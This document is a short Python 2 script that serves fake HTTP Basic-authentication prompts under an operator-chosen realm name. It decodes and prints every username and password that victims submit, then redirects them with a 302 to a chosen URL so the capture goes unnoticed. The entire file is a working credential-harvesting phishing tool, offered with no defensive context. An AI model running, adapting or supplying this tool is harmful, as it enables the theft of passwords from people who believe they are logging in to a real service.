import os
import re
import sys
import time
import base64
import BaseHTTPServer

try:
	url = sys.argv[1]
	realm = sys.argv[2]
	tries = int(sys.argv[3])

except:
	print 'usage:', os.path.basename(sys.argv[0]), '<url> <realm> <tries>'

	sys.exit(1)

class HTTPHandler(BaseHTTPServer.BaseHTTPRequestHandler):
	def do_GET(self):
		self.handle_request()

	def do_POST(self):
		self.handle_request()

	def handle_request(self):
		global url
		global realm
		global tries

		if tries > 0:
			self.send_response(401)
			self.send_header('WWW-Authenticate', 'Basic realm="%s"' % realm)
			self.send_header('Content-type', 'text/plain')
			self.end_headers()

			self.wfile.write('401')

			tries -= 1

			if self.headers.has_key('Authorization'):
				print '\n\t', base64.decodestring(self.headers['Authorization'][6:]), '\n'

		else:
			self.send_response(302)
			self.send_header('Location', url)
			self.end_headers()
			self.wfile.write('302')

try:
	server = BaseHTTPServer.HTTPServer(('', 80), HTTPHandler)

	print 'started httpserver...'

	server.serve_forever()

except KeyboardInterrupt:
	print '^C received, shutting down server...'

	server.socket.close()
